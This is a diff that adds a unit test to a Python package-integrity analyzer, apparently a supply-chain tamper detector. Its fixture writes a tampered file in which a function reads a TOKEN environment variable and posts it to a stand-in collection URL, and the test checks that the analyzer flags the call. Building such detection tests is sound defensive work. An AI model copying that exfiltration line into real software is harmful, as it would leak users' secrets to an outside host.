@@ -43,6 +43,26 @@ class IntegrityAnalyzerTests(unittest.TestCase):
         self.assertIn("run", modified.evidence["changed_functions"])
         self.assertIn("exec(", modified.evidence["new_dangerous_tokens"])
 
+    def test_modified_file_reports_added_suspicious_call_summary(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            source = root / "source"
+            dist = root / "dist"
+            source.mkdir()
+            dist.mkdir()
+            (source / "a.py").write_text("def run():\n    return 'ok'\n", encoding="utf-8")
+            (dist / "a.py").write_text(
+                "import os, requests\n"
+                "def run():\n"
+                "    token = os.getenv('TOKEN')\n"
+                "    requests.post('https://example.invalid/collect', data=token)\n",
+                encoding="utf-8",
+            )
+            findings = analyze_integrity(dist, source)
+        modified = next(finding for finding in findings if finding.rule_id == "I002")
+        self.assertIn("requests.post", modified.evidence["added_suspicious_calls"])
+        self.assertIn("I004", {finding.rule_id for finding in findings})
+
     def test_extract_source_repository_hint(self) -> None:
         metadata = {"project_urls": {"Repository": "https://github.com/example/project"}, "version": "1.0.0"}
         self.assertEqual(extract_source_repository_hint(metadata), "https://github.com/example/project")
